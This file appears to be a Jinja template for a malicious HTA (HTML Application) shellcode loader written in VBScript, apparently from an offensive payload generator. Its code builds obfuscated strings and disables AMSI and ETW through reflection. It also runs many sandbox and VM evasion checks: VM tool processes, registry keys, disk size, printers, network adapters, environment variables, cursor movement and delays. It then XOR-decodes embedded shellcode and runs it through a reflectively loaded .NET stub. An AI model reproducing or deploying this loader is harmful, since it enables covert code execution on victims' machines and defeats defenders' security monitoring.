<html>
<head>
<title>{{ v.title }}</title>
<HTA:APPLICATION ID="{{ v.app_id }}"
                 APPLICATIONNAME="{{ v.app_name }}"
                 BORDER="thin"
                 BORDERSTYLE="normal"
                 CAPTION="yes"
                 SHOWINTASKBAR="no"
                 SINGLEINSTANCE="yes"
                 SYSMENU="yes"
                 WINDOWSTATE="minimize" />
</head>
<body>
<script language="VBScript">
Function {{ v.fn_build_str }}(a)
    Dim s, i: s = ""
    For i = 0 To UBound(a): s = s & Chr(a(i)): Next
    {{ v.fn_build_str }} = s
End Function

Sub {{ v.fn_amsi }}()
    On Error Resume Next
    Dim asm: Set asm = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
    Dim amsiT: Set amsiT = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_auto_amsi_utils }})))
    If Not amsiT Is Nothing Then
        amsiT.GetField({{ v.fn_build_str }}(Array({{ v.jsc_amsi_init_fail }})), 36).SetValue Nothing, True
    End If
End Sub

Sub {{ v.fn_etw }}()
    On Error Resume Next
    Dim asm: Set asm = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
    Dim t: Set t = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_eventing_ep }})))
    If Not t Is Nothing Then
        Dim fi: Set fi = t.GetField({{ v.fn_build_str }}(Array({{ v.jsc_m_enabled }})), 36)
        If Not fi Is Nothing Then fi.SetValue Nothing, 0
    End If
End Sub

Function {{ v.fn_sandbox }}()
    {{ v.fn_sandbox }} = False
    On Error Resume Next
    If Screen.Width < 800 Or Screen.Height < 600 Then {{ v.fn_sandbox }} = True: Exit Function
    Dim wmi: Set wmi = GetObject("winmgmts:")
    Dim procs: Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
    Dim badList: badList = Array("vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe")
    Dim p, j
    For Each p In procs
        Dim pn: pn = LCase(p.Name)
        For j = 0 To UBound(badList)
            If pn = badList(j) Then {{ v.fn_sandbox }} = True: Exit Function
        Next
    Next
    ' VM registry checks (paths obfuscated via fn_build_str)
    On Error Resume Next
    Dim sh: Set sh = CreateObject("WScript.Shell")
    sh.RegRead {{ v.fn_build_str }}(Array(72,75,76,77,92,83,79,70,84,87,65,82,69,92,86,77,119,97,114,101,44,32,73,110,99,46,92,86,77,119,97,114,101,32,84,111,111,108,115,92,73,110,115,116,97,108,108,80,97,116,104))
    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
    Err.Clear
    sh.RegRead {{ v.fn_build_str }}(Array(72,75,76,77,92,83,79,70,84,87,65,82,69,92,79,114,97,99,108,101,92,86,105,114,116,117,97,108,66,111,120,32,71,117,101,115,116,32,65,100,100,105,116,105,111,110,115,92,86,101,114,115,105,111,110))
    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
    Err.Clear
    Dim fso2, drv2
    Set fso2 = CreateObject("Scripting.FileSystemObject")
    On Error Resume Next
    Set drv2 = fso2.GetDrive("C:")
    If Err.Number = 0 Then
        If drv2.TotalSize < 53687091200 Then {{ v.fn_sandbox }} = True: Set fso2 = Nothing: Exit Function
    End If
    On Error GoTo 0
    Set fso2 = Nothing
    On Error Resume Next
    Dim wmiPrt, printers, prtCount
    Set wmiPrt = GetObject("winmgmts:")
    If Err.Number = 0 Then
        Set printers = wmiPrt.ExecQuery("SELECT Name FROM Win32_Printer")
        prtCount = 0
        Dim oPrt
        For Each oPrt In printers: prtCount = prtCount + 1: Next
        If prtCount = 0 Then {{ v.fn_sandbox }} = True: Set wmiPrt = Nothing: Exit Function
    End If
    On Error GoTo 0
    Set wmiPrt = Nothing
    On Error Resume Next
    Dim wmiNa, naQ, naCnt
    Set wmiNa = GetObject("winmgmts:")
    If Err.Number = 0 Then
        Set naQ = wmiNa.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL")
        naCnt = 0
        Dim oNa
        For Each oNa In naQ: naCnt = naCnt + 1: Next
        If naCnt < 2 Then {{ v.fn_sandbox }} = True: Set wmiNa = Nothing: Exit Function
    End If
    On Error GoTo 0
    Set wmiNa = Nothing
    On Error Resume Next
    Dim _venv: Set _venv = CreateObject("WScript.Shell").Environment("Process")
    If _venv("VBOX_VERSION") <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
    If _venv("SANDBOXIE_HOME") <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
    Set _venv = Nothing
    On Error GoTo 0
End Function

Sub {{ v.sub_run }}()
    If {{ v.fn_sandbox }}() Then self.close: Exit Sub
    ' Record cursor position before delay; check movement after — no extra wait
    Dim _cx0, _cy0, _gotCur
    _cx0 = -999: _cy0 = -999: _gotCur = False
    On Error Resume Next
    Dim _ca: Set _ca = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
    If Err.Number = 0 Then
        Dim _wf: Set _wf = _ca.LoadWithPartialName("System.Windows.Forms")
        If Err.Number = 0 And Not IsNull(_wf) And Not IsEmpty(_wf) Then
            Dim _ct: Set _ct = _wf.GetType("System.Windows.Forms.Cursor")
            If Err.Number = 0 And Not IsNull(_ct) Then
                Dim _pp: Set _pp = _ct.GetProperty("Position", 24)
                If Err.Number = 0 And Not IsNull(_pp) Then
                    Dim _ps: Set _ps = _pp.GetValue(Nothing, Nothing)
                    If Err.Number = 0 And Not IsNull(_ps) Then
                        _cx0 = _ps.GetType().GetProperty("X").GetValue(_ps, Nothing)
                        _cy0 = _ps.GetType().GetProperty("Y").GetValue(_ps, Nothing)
                        If Err.Number = 0 Then _gotCur = True
                    End If
                End If
            End If
        End If
    End If
    Err.Clear
    On Error GoTo 0
    ' Brief execution delay (defeats fast sandbox timeouts)
    Dim t0: t0 = Timer
    Do While Timer - t0 < 2 + Rnd * 3: Loop
    ' Cursor check: if position unchanged over the delay, treat as sandbox
    If _gotCur Then
        On Error Resume Next
        Dim _ca2: Set _ca2 = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
        If Err.Number = 0 Then
            Dim _wf2: Set _wf2 = _ca2.LoadWithPartialName("System.Windows.Forms")
            If Err.Number = 0 And Not IsNull(_wf2) And Not IsEmpty(_wf2) Then
                Dim _ct2: Set _ct2 = _wf2.GetType("System.Windows.Forms.Cursor")
                If Err.Number = 0 And Not IsNull(_ct2) Then
                    Dim _pp2: Set _pp2 = _ct2.GetProperty("Position", 24)
                    If Err.Number = 0 And Not IsNull(_pp2) Then
                        Dim _ps2: Set _ps2 = _pp2.GetValue(Nothing, Nothing)
                        If Err.Number = 0 And Not IsNull(_ps2) Then
                            Dim _cx2, _cy2
                            _cx2 = _ps2.GetType().GetProperty("X").GetValue(_ps2, Nothing)
                            _cy2 = _ps2.GetType().GetProperty("Y").GetValue(_ps2, Nothing)
                            If Err.Number = 0 Then
                                If _cx0 = _cx2 And _cy0 = _cy2 Then self.close: Exit Sub
                            End If
                        End If
                    End If
                End If
            End If
        End If
        Err.Clear
        On Error GoTo 0
    End If
    Call {{ v.fn_amsi }}()
    Call {{ v.fn_etw }}()

    Dim sc_hex, key_hex
    sc_hex  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
    key_hex = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}

    Dim _k()
    _k = {{ v.fn_hex2arr }}(key_hex)
    Dim _ki
    For _ki = 0 To UBound(_k): _k(_ki) = _k(_ki) Xor {{ key_tweak }}: Next

    Dim sc(), i
    ReDim sc(Len(sc_hex) / 2 - 1)
    For i = 0 To Len(sc_hex) / 2 - 1
        sc(i) = CInt("&H" & Mid(sc_hex, i * 2 + 1, 2)) Xor _
                _k(i Mod (UBound(_k) + 1))
    Next

    Dim loader: Set loader = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
    Dim stub_hex: stub_hex = "{{ v.dotnet_stub_hex }}"
    Dim stub_bytes(): ReDim stub_bytes(Len(stub_hex) / 2 - 1)
    For i = 0 To Len(stub_hex) / 2 - 1
        stub_bytes(i) = CInt("&H" & Mid(stub_hex, i * 2 + 1, 2))
    Next

    Dim asm: Set asm = loader.Load((stub_bytes))
    Dim t:   Set t   = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_stub_loader }})))
    Dim mi:  Set mi  = t.GetMethod({{ v.fn_build_str }}(Array({{ v.jsc_stub_run }})))
    mi.Invoke Nothing, Array((sc))
    self.close
End Sub

Call {{ v.sub_run }}()
</script>
</body>
</html>
